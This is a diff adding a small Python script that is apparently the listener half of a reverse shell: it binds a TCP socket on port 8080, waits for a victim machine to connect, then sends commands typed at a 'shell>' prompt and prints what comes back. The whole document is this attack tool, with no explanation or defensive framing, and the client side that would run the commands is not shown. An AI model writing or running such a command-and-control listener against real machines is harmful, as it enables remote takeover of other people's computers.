@@ -1,0 +1,31 @@
+import os
+import socket
+
+def connect():
+    Mysocket = socket.socket()
+    Mysocket.bind(("192.168.86.43", 8080))
+    Mysocket.listen(1)
+    print("*" *60)
+    print("Waiting for connection...")
+    print("*" *60)
+    print("[+] Listening for incoming TCP connections to port 8080")
+    connection,address = Mysocket.accept()
+    print("Connection established from",address)
+
+    while True:
+        print("=" * 60)
+        command = input("shell> : ")
+
+        if "terminate" in command:
+            connection.send("terminate".encode())
+            connection.close()
+            break
+        else:
+            connection.send(command.encode())
+            print(connection.recv(5000).decode())
+
+def main():
+    connect()
+
+main()
+
